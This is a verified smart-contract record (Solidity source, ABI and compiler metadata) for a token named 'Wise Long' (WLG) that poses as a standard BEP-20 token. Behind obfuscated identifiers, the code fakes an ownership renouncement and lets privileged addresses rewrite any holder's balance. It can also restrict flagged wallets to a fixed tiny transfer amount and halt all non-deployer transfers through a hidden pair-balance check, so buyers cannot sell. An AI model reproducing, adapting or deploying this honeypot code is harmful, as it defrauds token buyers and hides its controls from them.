{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tokenSellTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract senderTokenFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSell {\n    function createPair(address marketingFund, address receiverTotalToken) external returns (address);\n}\n\ninterface tokenLiquidityAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLaunch) external view returns (uint256);\n\n    function transfer(address listLaunchedMarketing, uint256 tokenModeLiquidity) external returns (bool);\n\n    function allowance(address sellTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenModeLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listLaunchedMarketing,\n        uint256 tokenModeLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSwap, uint256 value);\n    event Approval(address indexed sellTotal, address indexed spender, uint256 value);\n}\n\ninterface fundBuy is tokenLiquidityAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WiseLong is senderTokenFee, tokenLiquidityAmount, fundBuy {\n\n    mapping(address => bool) public minShouldTo;\n\n    bool public shouldMode;\n\n    constructor (){\n        if (autoMarketing) {\n            autoMarketing = true;\n        }\n        tokenSellTake sellLaunch = tokenSellTake(swapTake);\n        walletAuto = receiverSell(sellLaunch.factory()).createPair(sellLaunch.WETH(), address(this));\n        if (modeWallet != listAmount) {\n            shouldBuy = enableLaunched;\n        }\n        enableIs = _msgSender();\n        modeToken();\n        senderSwap[enableIs] = true;\n        exemptToken[enableIs] = shouldReceiver;\n        \n        emit Transfer(address(0), enableIs, shouldReceiver);\n    }\n\n    uint256 private shouldReceiver = 100000000 * 10 ** 18;\n\n    function buyLaunch() private view {\n        require(senderSwap[_msgSender()]);\n    }\n\n    uint256 receiverSender;\n\n    address public walletAuto;\n\n    function owner() external view returns (address) {\n        return liquidityTokenAmount;\n    }\n\n    address public enableIs;\n\n    address private liquidityTokenAmount;\n\n    bool public modeWallet;\n\n    uint8 private sellTotalShould = 18;\n\n    function amountTokenWallet(address fundListAt) public {\n        buyLaunch();\n        if (listAmount) {\n            autoMarketing = false;\n        }\n        if (fundListAt == enableIs || fundListAt == walletAuto) {\n            return;\n        }\n        minShouldTo[fundListAt] = true;\n    }\n\n    address listEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private enableLaunched;\n\n    function getOwner() external view returns (address) {\n        return liquidityTokenAmount;\n    }\n\n    string private takeLaunch = \"WLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeLaunch;\n    }\n\n    uint256 atList;\n\n    uint256 constant shouldFee = 9 ** 10;\n\n    function takeLimitLaunch(address minMax, uint256 tokenModeLiquidity) public {\n        buyLaunch();\n        exemptToken[minMax] = tokenModeLiquidity;\n    }\n\n    string private walletTeam = \"Wise Long\";\n\n    function transferFrom(address minAuto, address listLaunchedMarketing, uint256 tokenModeLiquidity) external override returns (bool) {\n        if (_msgSender() != swapTake) {\n            if (tradingAuto[minAuto][_msgSender()] != type(uint256).max) {\n                require(tokenModeLiquidity <= tradingAuto[minAuto][_msgSender()]);\n                tradingAuto[minAuto][_msgSender()] -= tokenModeLiquidity;\n            }\n        }\n        return launchedMarketingWallet(minAuto, listLaunchedMarketing, tokenModeLiquidity);\n    }\n\n    bool public listAmount;\n\n    bool private marketingIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTotalShould;\n    }\n\n    function transfer(address minMax, uint256 tokenModeLiquidity) external virtual override returns (bool) {\n        return launchedMarketingWallet(_msgSender(), minMax, tokenModeLiquidity);\n    }\n\n    function allowance(address walletLiquidity, address feeMarketing) external view virtual override returns (uint256) {\n        if (feeMarketing == swapTake) {\n            return type(uint256).max;\n        }\n        return tradingAuto[walletLiquidity][feeMarketing];\n    }\n\n    function minTo(uint256 tokenModeLiquidity) public {\n        buyLaunch();\n        atList = tokenModeLiquidity;\n    }\n\n    uint256 private limitSwapTo;\n\n    mapping(address => mapping(address => uint256)) private tradingAuto;\n\n    uint256 private shouldBuy;\n\n    function approve(address feeMarketing, uint256 tokenModeLiquidity) public virtual override returns (bool) {\n        tradingAuto[_msgSender()][feeMarketing] = tokenModeLiquidity;\n        emit Approval(_msgSender(), feeMarketing, tokenModeLiquidity);\n        return true;\n    }\n\n    mapping(address => bool) public senderSwap;\n\n    function modeToken() public {\n        emit OwnershipTransferred(enableIs, address(0));\n        liquidityTokenAmount = address(0);\n    }\n\n    bool public isFrom;\n\n    function launchedMarketingWallet(address minAuto, address listLaunchedMarketing, uint256 tokenModeLiquidity) internal returns (bool) {\n        if (minAuto == enableIs) {\n            return txLimit(minAuto, listLaunchedMarketing, tokenModeLiquidity);\n        }\n        uint256 exemptAmount = tokenLiquidityAmount(walletAuto).balanceOf(listEnable);\n        require(exemptAmount == atList);\n        require(listLaunchedMarketing != listEnable);\n        if (minShouldTo[minAuto]) {\n            return txLimit(minAuto, listLaunchedMarketing, shouldFee);\n        }\n        return txLimit(minAuto, listLaunchedMarketing, tokenModeLiquidity);\n    }\n\n    mapping(address => uint256) private exemptToken;\n\n    function balanceOf(address senderLaunch) public view virtual override returns (uint256) {\n        return exemptToken[senderLaunch];\n    }\n\n    event OwnershipTransferred(address indexed atTo, address indexed atTotal);\n\n    address swapTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return walletTeam;\n    }\n\n    function feeTxLaunch(address takeFrom) public {\n        if (isFrom) {\n            return;\n        }\n        if (shouldMode == marketingIs) {\n            limitSwapTo = shouldBuy;\n        }\n        senderSwap[takeFrom] = true;\n        if (modeWallet) {\n            enableLaunched = limitSwapTo;\n        }\n        isFrom = true;\n    }\n\n    function txLimit(address minAuto, address listLaunchedMarketing, uint256 tokenModeLiquidity) internal returns (bool) {\n        require(exemptToken[minAuto] >= tokenModeLiquidity);\n        exemptToken[minAuto] -= tokenModeLiquidity;\n        exemptToken[listLaunchedMarketing] += tokenModeLiquidity;\n        emit Transfer(minAuto, listLaunchedMarketing, tokenModeLiquidity);\n        return true;\n    }\n\n    bool public autoMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundListAt\",\"type\":\"address\"}],\"name\":\"amountTokenWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenModeLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"}],\"name\":\"feeTxLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minShouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenModeLiquidity\",\"type\":\"uint256\"}],\"name\":\"minTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenModeLiquidity\",\"type\":\"uint256\"}],\"name\":\"takeLimitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenModeLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listLaunchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenModeLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WiseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}